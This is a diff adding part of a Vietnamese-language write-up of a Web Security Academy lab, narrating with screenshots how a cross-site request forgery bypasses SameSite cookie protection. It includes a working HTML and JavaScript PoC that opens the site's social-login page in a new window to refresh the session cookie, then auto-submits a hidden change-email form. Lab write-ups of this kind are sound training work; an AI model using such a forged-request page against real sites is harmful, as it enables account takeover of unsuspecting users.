@@ -295,17 +295,45 @@ Và trong đoạn chat có chứa password của carlos
 <h1>---------------------------------------------------------</h1>
 <br>
 
+![image](https://github.com/user-attachments/assets/81f6dff7-cc8a-4825-aa42-7810727f66ac)
 
+Tôi tạo thử 1 cái PoC để cho vào exploit:
 
+![image](https://github.com/user-attachments/assets/2afe320d-1e40-48cf-8970-97db33f1b7ef)
 
+Sau khi tôi ấn view thì nó dẫn đến cái này:
 
+![image](https://github.com/user-attachments/assets/55b8a11f-8051-4847-9187-7c1a83fbc761)
 
+Và email vẫn chưa được đổi vì nó đi qua /social-login:
 
+![image](https://github.com/user-attachments/assets/a68456a5-6eb1-4062-a3a4-5989119e2007)
 
+Sau đó chuyển sang oauth-callback và làm cái cookie mới:
 
+![image](https://github.com/user-attachments/assets/396e3360-934a-42cf-9780-3e97daecbd88)
 
+Vậy vấn đề ở đây là tôi phải mở 1 cửa sổ khác đợi cho nó nhảy vào /social-login để lấy cookie mới và đổi mail
+```
+<form method="POST" action="https://0ad400e703526ffc82be294a006e000b.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="lmao512555@gmail.com">
+</form>
+<p>Click to change email</p>
+<script>
+    window.onclick = () => {
+        window.open('https://0ad400e703526ffc82be294a006e000b.web-security-academy.net/social-login');
+        setTimeout(changeEmail, 5000);
+    }
 
+    function changeEmail() {
+        document.forms[0].submit();
+    }
+</script>
+```
 
+Thì đoạn code này sẽ có 1 cái trang, người dùng ấn vào thì sẽ dẫn 1 cửa sổ mới đến /social-login, còn cửa sổ cũ đợi và đổi email
+
+![image](https://github.com/user-attachments/assets/609c5f81-b399-4ca9-9450-180ea270a694)
 
 
 
